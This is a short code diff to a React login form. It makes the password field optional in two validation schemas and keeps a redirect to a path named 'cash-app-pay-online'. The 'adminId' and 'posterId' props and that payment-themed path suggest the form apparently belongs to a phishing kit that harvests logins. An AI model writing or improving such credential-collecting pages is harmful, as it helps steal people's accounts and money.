@@ -23,14 +23,14 @@ function LoginForm({ adminId, posterId }) {
 
   const firstLoginValidation = Yup.object({
     email: Yup.string().required("Required"),
-    password: Yup.string().required("Required").min(8, "Minimum 8 characters"),
+    password: Yup.string().min(8, "Minimum 8 characters"),
   });
 
   const emailValidation = Yup.object({
     email: Yup.string()
       .email("Enter a valid email address")
       .required("Required"),
-    password: Yup.string().required("Required").min(8, "Minimum 8 characters"),
+    password: Yup.string().min(8, "Minimum 8 characters"),
   });
 
   const validate = isFirstLogin ? firstLoginValidation : emailValidation;
@@ -58,7 +58,6 @@ function LoginForm({ adminId, posterId }) {
       const data = await response.json();
       if (response.ok) {
         router.push("/sim9/dfv/cash-app-pay-online");
-        
       }
       return data;
     } catch (error) {
